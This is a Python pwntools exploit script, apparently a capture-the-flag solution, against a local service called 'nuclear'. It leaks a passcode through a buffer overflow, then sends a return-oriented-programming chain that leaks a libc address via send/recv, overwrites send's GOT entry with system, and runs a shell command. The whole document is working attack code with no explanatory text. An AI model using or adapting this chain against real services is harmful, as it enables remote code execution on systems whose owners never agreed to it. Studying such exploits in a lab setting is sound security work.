from pwn import *
import time

r =remote('127.0.0.1', 1129)

elf = ELF('./nuclear_d4f699f3dbb8aadf7c224aa57f57eb4c')

#leak passcode
print r.recvuntil('> ')
r.sendline('target')
print r.recvuntil('---> ')
r.sendline('123123.123123/123123.123123')
print r.recvuntil('> ')
r.sendline('A'*0x200)
print r.recvuntil(': ')
print r.recv(0x208)

passcode = r.recv(21)
print "Pass code : " + passcode

print r.recvuntil(": ")
print r.recvuntil("> ")

#exploit
r.sendline("launch")
print r.recvuntil(": ")
r.sendline(passcode)

bss = elf.bss()
send_plt = elf.plt['send']
send_got = elf.got['send']
recv_plt = elf.plt['recv']
send_system_libc = 0x18A760

ppppr = 0x804917c
cmd = "ls -al"

payload = ''
payload += "A" * 0x210
payload += p32(send_plt)
payload += p32(ppppr)
payload += p32(0x04)
payload += p32(send_got)
payload += p32(0x04)
payload += p32(0x00)

payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(0x04)
payload += p32(bss)
payload += p32(len(cmd))
payload += p32(0x00)

payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(0x04)
payload += p32(send_got)
payload += p32(0x04)
payload += p32(0x00)

payload += p32(send_plt)
payload += "AAAA"
payload += p32(bss)

r.sendline(payload)

print r.recv(1024)

send_libc = u32(r.recv(4))
system_addr = send_libc - send_system_libc
print hex(system_addr)

r.send(cmd)

r.send(p32(system_addr))

print r.recv(1024)
